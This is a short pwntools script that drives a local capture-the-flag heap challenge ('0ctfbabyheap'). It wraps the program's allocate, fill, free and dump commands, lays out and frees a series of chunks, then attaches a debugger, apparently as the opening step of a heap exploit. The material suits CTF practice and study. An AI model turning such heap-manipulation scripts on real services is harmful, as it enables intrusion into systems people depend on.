#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./0ctfbabyheap"

p = process(elf)

def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
    return p.recvline()[15:-1]

def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)

def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()


alloc(0x10)
alloc(0x18)
alloc(0x20)
alloc(0x28)
alloc(0x30)
alloc(0x38)
alloc(0x40)
alloc(0x48)
alloc(0x50)
alloc(0x58)
alloc(0x60)
alloc(0x68)
alloc(0x70)
alloc(0x78)
alloc(0x0)
alloc(0x1)
free(0)
free(2)
free(4)
free(6)
free(8)
free(10)
free(12)
gdb.attach(p)

dump(0)
